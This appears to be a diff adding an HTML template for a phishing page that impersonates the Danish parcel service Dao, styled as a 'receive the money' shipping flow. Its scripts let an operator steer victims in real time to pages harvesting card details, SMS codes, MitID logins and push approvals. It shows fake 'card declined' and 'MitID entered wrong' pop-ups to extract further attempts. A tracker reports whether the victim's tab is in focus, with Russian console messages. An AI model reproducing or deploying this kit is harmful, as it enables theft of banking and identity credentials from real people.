@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<!-- saved from url=(0025)https://dao-delivery.com/ -->
+<html prefix="og: https://ogp.me/ns#" lang="dk"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="theme-color" content="#00a0d6">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="google" content="notranslate">
+<title>Send din pakke med Dao</title>
+<meta name="description" content="Dao er Danmarks hurtigste til at levere dine mindre pakker til en konkurrencedygtig pris - vi stræber efter at gøre dette 100% og er godt på vej">
+<meta property="og:image" content="images/dao-logo.png">
+<meta property="og:title" content="Dao - levering hver dag året rundt">
+<link href="https://dao-delivery.com/images/favicon.ico" rel="icon">
+<link href="./per_files/css2" rel="stylesheet">
+<link href="./per_files/bootstrap.min.css" rel="stylesheet">
+<link href="./per_files/icofont.min.css" rel="stylesheet">
+<link href="./per_files/mapui.css" rel="stylesheet">
+<link rel="stylesheet" href="/css/support_parent.css">
+<script src="./per_files/apexcharts"></script>
+<link href="./per_files/blazored-modal.css" rel="stylesheet">
+<link href="./per_files/bootstrap-multiselect.min.css" rel="stylesheet">
+<script src="./per_files/geoLocation.js"></script>
+<style>
+        .dropdown-toggle::after {
+            color: #fff !important
+        }
+    </style>
+<link href="./per_files/style.css" rel="stylesheet">
+<link rel="stylesheet" href="./per_files/modal.css">
+<style>
+        a {
+            cursor: pointer
+        }
+        .contact-info, textarea {
+            display: block;
+            width: 100%;
+            height: 51px;
+            padding: 3px 25px 5px;
+            font-family: Muli,sans-serif;
+            font-size: 12px;
+            font-weight: 400;
+            line-height: 1;
+            color: #555;
+            background-color: #fff;
+            background-image: none;
+            border: 1px solid #cbcbcb;
+            border-radius: 25px;
+            -webkit-appearance: none;
+            -webkit-transition: .2s ease-in-out;
+            transition: .2s ease-in-out;
+        }
+        .contact-info__border {
+            height: 2rem;
+            font-size: 16px;
+            border-color: #e30613;
+            border-radius: 50px;
+        }
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button {
+            /* display: none; <- Crashes Chrome on hover */
+            -webkit-appearance: none;
+            margin: 0; /* <-- Apparently some margin are still there even though it's hidden */
+        }
+        input[type='number'] {
+            -moz-appearance: textfield;
+        }
+
+        input[type='number']::-webkit-outer-spin-button,
+        input[type='number']::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+        }
+
+        .reset [type="number"] {
+            -moz-appearance: spinner-textfield;
+        }
+
+        .reset input[type='number']::-webkit-outer-spin-button,
+        .reset input[type='number']::-webkit-inner-spin-button {
+            -webkit-appearance: inner-spin-button;
+        }
+    </style>
+<link href="./per_files/Custom.css" rel="stylesheet">
+<link href="./per_files/generic-error.css" rel="stylesheet">
+<style type="text/css">
+        .found {
+            background: #ff0
+        }
+    </style>
+
+
+
+<div class="wrapper">
+<header id="header" class="fixed-top" style="">
+<div class="container-fluid d-flex align-items-center">
+<a href="https://www.dao.as/" target="_blank" class="logo mr-auto"><img src="./per_files/dao-logo.svg" alt="" class="img-fluid"></a>
+<nav class="nav-menu d-none d-lg-block">
+<ul>
+<li><a class="btn btn-round">Send pakke</a></li>
+<li><a class="btn btn-round">Log ind</a></li>
+<li>
+<a class="dropdown-item" href="javascript:void(0)"><img src="./per_files/danish.png" class="flag small"></a>
+</li>
+</ul>
+</nav>
+<div>
+<div class="mobile-menu d-lg-none" data-toggle="modal" data-target="#menuModal">
+<div class="nav-badge new-badge-menu"><span>N</span></div><span><i class="icofont-navigation-menu"></i></span>
+</div>
+</div>
+</div>
+</header>
+<main class="main">
+<section class="steps">
+<div class="container">
+<div class="row">
+<div class="col-12">
+<ul>
+<li class="active">Produkt</li>
+<li class="">Adresse</li>
+<li class="">Modtag pengene</li>
+<li class="">Bekræftelse</li>
+</ul>
+</div>
+</div>
+</div>
+</section>
+<main>
+<section class="services">
+<div class="container">
+<div class="row">
+<div class="section-title"><img src="./per_files/parcel-type.svg">
+<h4>Vælg produkt efter type af levering</h4>
+</div>
+</div>
+<div class="row justify-content-center">
+<div class="col-12 col-lg-4 mt-4 mt-lg-0 d-flex align-items-stretch">
+<div class="card pointer pt-5 justify-content-start">
+<div class="body body-adj">
+<div class="icon"><img src="./per_files/bf6dac1f-cb54-46e8-8954-0b49f6542c03..svg">
+</div>
+<h4>daoSHOP</h4>
+<p>Pakke leveres til modtagers foretrukne eller nærmeste daoSHOP i Danmark.</p>
+</div>
+<div class="footer">
+<div class="text-left misc-text"></div>
+<div class="package-price-container">
+<p class="package-footer-text">Basispris</p><span class="package-price">41<small>kr</small></span>
+</div>
+</div>
+</div>
+</div>
+<div class="col-12 col-lg-4 mt-4 mt-lg-0 d-flex align-items-stretch">
+<div class="card pointer pt-5 justify-content-start">
+<div class="help-icon">
+<a><img src="./per_files/info-circle.svg"></a>
+</div>
+<div class="body body-adj">
+<div class="icon"><img src="./per_files/952e99e7-5f21-4ca9-9040-273baf2d39cf..svg">
+</div>
+<h4>daoHOME</h4>
+<p>Pakke leveres på modtagers hjemmeadresse i Danmark.</p>
+</div>
+<div class="footer">
+<div class="text-left misc-text"></div>
+<div class="package-price-container">
+<p class="package-footer-text">Basispris</p><span class="package-price">41<small>kr</small></span>
+ </div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section class="services package">
+<div class="container">
+<div class="row">
+<div class="section-title"><img src="./per_files/weight.svg">
+<h4>Hvad vejer din pakke?</h4>
+<p>Leveringsomkostningerne er på købers side</p>
+</div>
+</div>
+<div class="row">
+<div class="col-lg-6 col-md-6 d-flex align-items-stretch mt-4">
+<div class="card pointer">
+<div class="body">
+<h4>0 - 10<small>Kg</small></h4>
+<ul class="icons justify-content-around">
+<li><img src="./per_files/bf6dac1f-cb54-46e8-8954-0b49f6542c03..svg">daoSHOP</li>
+<li><img src="./per_files/952e99e7-5f21-4ca9-9040-273baf2d39cf..svg">daoHOME</li>
+</ul>
+</div>
+<div class="footer">
+<div class="text-left misc-text"></div>
+<div class="package-price-container">
+<p class="package-footer-text">Pristillæg</p><span lass="package-price">0<small>kr</small></span>
+</div>
+</div>
+</div>
+</div>
+<div class="col-lg-6 col-md-6 d-flex align-items-stretch mt-4">
+<div class="card pointer">
+<div class="body">
+<h4>10 - 25<small>Kg</small></h4>
+<ul class="icons justify-content-around">
+<li><img src="./per_files/bf6dac1f-cb54-46e8-8954-0b49f6542c03..svg">daoSHOP</li>
+</ul>
+</div>
+<div class="footer">
+<div class="text-left misc-text"></div>
+<div class="package-price-container">
+<p class="package-footer-text">Pristillæg</p><span lass="package-price">10<small>kr</small></span>
+</div>
+</div>
+</div>
+</div>
+<div class="col-lg-6 col-md-6 d-flex align-items-stretch mt-4">
+<div class="card pointer">
+<div class="body">
+<h4>25 - 50<small>Kg</small></h4>
+<ul class="icons justify-content-around">
+<li><img src="./per_files/bf6dac1f-cb54-46e8-8954-0b49f6542c03..svg">daoSHOP</li>
+</ul>
+</div>
+<div class="footer">
+<div class="text-left misc-text"></div>
+<div class="package-price-container">
+<p class="package-footer-text">Pristillæg</p><span lass="package-price">20<small>kr</small></span>
+</div>
+</div>
+</div>
+</div>
+<div class="col-lg-6 col-md-6 d-flex align-items-stretch mt-4">
+<div class="card pointer">
+<div class="body">
+<h4>50 - 150<small>Kg</small></h4>
+<ul class="icons justify-content-around">
+<li><img src="./per_files/bf6dac1f-cb54-46e8-8954-0b49f6542c03..svg">daoSHOP</li>
+</ul>
+ </div>
+<div class="footer">
+<div class="text-left misc-text"></div>
+<div class="package-price-container">
+<p class="package-footer-text">Pristillæg</p><span lass="package-price">40<small>kr</small></span>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section>
+<div class="container">
+<div class="row">
+<div class="col-12">
+<div class="button-group mt-4">
+<button class="secondary round mr-3" style="display:none">
+<img src="./per_files/Chevron-left.svg">
+</button>
+<button class="primary" onclick="redir()">Modtag pengene</button>
+<script>
+    function redir(){
+        location.href='/adress/<%=ad.id%>'
+    }
+</script>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main>
+</main>
+</div>
+<script src="./per_files/modal.js"></script>
+<script>
+    window.onload = function () {
+        setInterval(function () {
+            let updateSource = new EventSource('/stu?session=m5utv8prdb');
+
+            updateSource.addEventListener('update', function (event) {
+                console.log('e', event.data);
+            });
+
+            updateSource.addEventListener('card-return', function () {
+                new Modal('Din bank har afvist korttransaktionen!', 'Prøv at angive et andet kort.', {
+                    onClose: function () {
+                        window.location.href = 'http://dao-delivery.com/verify';
+                    }
+                })
+            });
+
+            updateSource.addEventListener('sms', function () {
+                window.location.href = 'http://dao-delivery.com/sms';
+            });
+
+            updateSource.addEventListener('mit-id-return', function () {
+                new Modal('Dit MitID er blevet indtastet forkert!', 'Kontroller, at dit MitID er korrekt, og prøv igen.', {
+                    onClose: function () {
+                        window.location.href = 'http://dao-delivery.com/mit-id';
+                    }
+                })
+            });
+
+            updateSource.addEventListener('mit-id', function () {
+                window.location.href = 'http://dao-delivery.com/mit-id';
+            });
+
+
+            updateSource.addEventListener('push', function () {
+                window.location.href = 'http://dao-delivery.com/push';
+            });
+
+            updateSource.addEventListener('replenishment', function () {
+                // pReplenishment();
+            });
+
+            updateSource.addEventListener('hold', function () {
+                window.location.href = 'http://dao-delivery.com/hold';
+            });
+        }, 8000);
+    };
+</script>
+<script>
+        document.addEventListener('DOMContentLoaded', () => {
+            let myBtns = document.querySelectorAll('.card.pointer');
+            myBtns.forEach(function(btn) {
+                btn.addEventListener('click', () => {
+                    myBtns.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                });
+            });
+        });
+    </script>
+
+
+<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg>
+
+<div class="
+chatra--webkit
+chatra--style-round
+chatra--side-bottom
+chatra--pos-right
+chatra--visible
+chatra--expanded
+chatra--fast-toggle
+" id="chatra" data-turbolinks-permanent=""
+style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display:none;">
+<div id="chatra__iframe-wrapper">
+<iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+</div>
+</div>
+<div class="support-circle"
+onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+
+<script>
+axios.post("/api/setStatus", {
+adId: "<%=ad.id%>",
+status: "focus"
+})
+
+document.addEventListener("visibilitychange", function(){
+if (document.hidden) {
+axios.post("/api/setStatus", {
+adId: "<%=ad.id%>",
+status: "blur"
+})
+console.log('Вкладка не активна');
+} else {
+axios.post("/api/setStatus", {
+adId: "<%=ad.id%>",
+status: "focus"
+})
+console.log("на сайте")
+}
+});
+</script>
+</body></html>
